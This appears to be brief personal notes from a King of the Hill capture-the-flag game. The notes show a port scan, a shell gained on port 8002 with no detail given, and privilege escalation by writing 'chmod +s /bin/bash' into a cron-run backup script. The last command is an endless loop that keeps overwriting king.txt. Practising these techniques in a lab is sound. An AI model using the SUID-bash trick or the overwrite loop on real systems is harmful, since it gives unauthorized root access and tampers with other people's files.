KOTH
Scan:
```terminal
└─# nmap -sV -Pn -p- --min-rate 5000 $ip
port 22
port 80
```
haven't see other port, i will try rustscan

got a shell on 8002
now root
PrivEsc
Got a crontab
```terminal
serv3@web-serv:/home/serv3/backups$ echo '#!/bin/bash
> chmod +s /bin/bash' > backup.sh
serv3@web-serv:/home/serv3/backups$ cat backup.sh 
#!/bin/bash
chmod +s /bin/bash

```
Now i just wait some minutes
flag on index.php
Become King
```
bash-4.4# cat king.txt 
bloman
bash-4.4# while True; do echo "bloman" > king.txt; done
bash: True: command not found
bash-4.4# while true; do echo "bloman" > king.txt; done
```
/var/lib for 3rd writeup